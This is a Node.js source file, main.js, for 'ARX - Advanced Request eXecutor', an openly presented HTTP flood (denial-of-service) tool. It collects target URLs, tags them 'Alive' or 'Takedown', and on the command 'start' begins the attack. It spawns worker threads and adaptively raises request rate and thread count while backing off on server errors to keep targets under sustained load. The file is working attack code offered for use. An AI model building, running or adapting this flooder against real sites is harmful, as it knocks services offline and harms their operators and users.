// main.js

const readline = require("readline");
const { Worker } = require("worker_threads");
const os = require("os");
const chalk = require("chalk");
const http = require("http");
const https = require("https");

console.clear();
console.log(chalk.greenBright.bold("Selamat datang di ARX - Advanced Request eXecutor [AutoScale]"));

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
readline.emitKeypressEvents(process.stdin);
if (process.stdin.isTTY) process.stdin.setRawMode(true);

let targets = [], workers = {}, stats = {}, statuses = {}, configs = {}, timers = {}, lastState = {};

function askURL(index = 0) {
  rl.question(`Target URL #${index + 1} (leave blank to finish): `, async (url) => {
    if (!url.trim()) {
      if (targets.length === 0) return askURL(index);
      return askCommand();
    }
    const isLive = await testTarget(url.trim());
    targets.push(url.trim());
    statuses[url.trim()] = isLive ? "Alive" : "Takedown";
    stats[url.trim()] = { sent: 0, success: 0, failed: 0 };
    configs[url.trim()] = { threads: 1, rps: 10, lastStable: 0 };
    workers[url.trim()] = [];
    askURL(index + 1);
  });
}

function askCommand() {
  rl.question("Type \"start\" to begin attack: ", (input) => {
    if (input.trim().toLowerCase() === "start") {
      startAttack();
    } else {
      askCommand();
    }
  });
}

function testTarget(url) {
  return new Promise((resolve) => {
    const lib = url.startsWith("https") ? https : http;
    const req = lib.get(url, { timeout: 5000 }, (res) => {
      res.resume();
      resolve(true);
    });
    req.on("error", () => resolve(false));
    req.on("timeout", () => {
      req.destroy();
      resolve(false);
    });
  });
}

function startAttack() {
  targets.forEach((url) => startTarget(url));
  displayStats();
  monitorCPU();
  listenCommand();
}

function startTarget(url) {
  const { threads, rps } = configs[url];
  for (let i = 0; i < threads; i++) spawnWorker(url, rps);
}

function spawnWorker(url, rps) {
  const worker = new Worker("./worker.js", { workerData: { target: url, rps } });
  worker.on("message", (msg) => {
    if (msg.type === "stats") {
      stats[url].sent += msg.sent;
      stats[url].success += msg.success;
      stats[url].failed += msg.failed;
      if (!lastState[url]) lastState[url] = [];
      lastState[url].push(...Object.keys(msg.codes).map(code => parseInt(code)));
      if (lastState[url].length > 10) lastState[url] = lastState[url].slice(-10);
      adaptiveControl(url);
    } else if (msg.type === "error") {
      restartWorker(url, rps);
    }
  });
  workers[url].push(worker);
}

function restartWorker(url, rps) {
  spawnWorker(url, rps);
}

function adaptiveControl(url) {
  const state = lastState[url];
  const cfg = configs[url];
  const failedCodes = state.filter((c) => c >= 500);
  if (failedCodes.length >= 5) {
    if (cfg.rps > 10) cfg.rps = Math.floor(cfg.rps * 0.7);
  } else {
    cfg.rps += 5;
    if (cfg.threads < os.cpus().length && cpuLoad() < 85) {
      cfg.threads++;
      spawnWorker(url, cfg.rps);
    }
  }
  workers[url].forEach((w) => w.postMessage({ type: "updateRPS", rps: cfg.rps }));
}

function displayStats() {
  setInterval(() => {
    readline.cursorTo(process.stdout, 0, 2);
    targets.forEach((url, i) => {
      const s = stats[url];
      const status = statuses[url] === "Alive" ? chalk.greenBright("Alive") : chalk.redBright("Takedown");
      readline.clearLine(process.stdout, 0);
      process.stdout.write(`[#${i}] ${chalk.yellow("Sent")}: ${s.sent} | ${chalk.green("Success")}: ${s.success} | ${chalk.red("Failed")}: ${s.failed} | ${chalk.cyan("Target")}: ${url} | ${status}\n`);
    });
    readline.moveCursor(process.stdout, 0, 1);
    readline.clearLine(process.stdout, 0);
    process.stdout.write("Command (stop): ");
  }, 1000);
}

function cpuLoad() {
  const cpus = os.cpus();
  let idle = 0, total = 0;
  cpus.forEach((cpu) => {
    for (let type in cpu.times) total += cpu.times[type];
    idle += cpu.times.idle;
  });
  const usage = 100 - Math.floor((idle / total) * 100);
  return usage;
}

function monitorCPU() {
  setInterval(() => {
    if (cpuLoad() > 85) {
      targets.forEach((url) => {
        if (configs[url].threads > 1) {
          configs[url].threads--;
          const victim = workers[url].pop();
          if (victim) victim.terminate();
        }
      });
    }
  }, 5000);
}

function listenCommand() {
  rl.on("line", (line) => {
    if (line.trim().toLowerCase() === "stop") {
      targets.forEach((url) => workers[url].forEach((w) => w.terminate()));
      console.log(chalk.redBright("\n[STOPPED] All targets stopped."));
      process.exit(0);
    }
  });
}

askURL();
